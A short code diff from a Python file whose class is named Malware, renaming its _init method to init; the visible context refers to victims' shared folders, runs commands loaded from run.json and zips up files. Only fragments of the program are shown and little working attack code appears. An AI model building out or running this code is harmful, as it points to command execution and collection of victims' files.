@@ -22,7 +22,7 @@ VICTIMS_FOLDER_IN = 'Z:\\VictimsSharedFolder'
 VICTIMS_FOLDER_OUT = 'Z:\\Victims\\'
 
 class Malware:
-	def _init(self):
+	def init(self):
 		with open("run.json", "r") as file:
 			run = json.load(file)
 			for commands in run:
@@ -88,4 +88,4 @@ class Malware:
 				ziph.write(os.path.join(root, file))
 				
 malware = Malware()
-malware._init()
+malware.init()
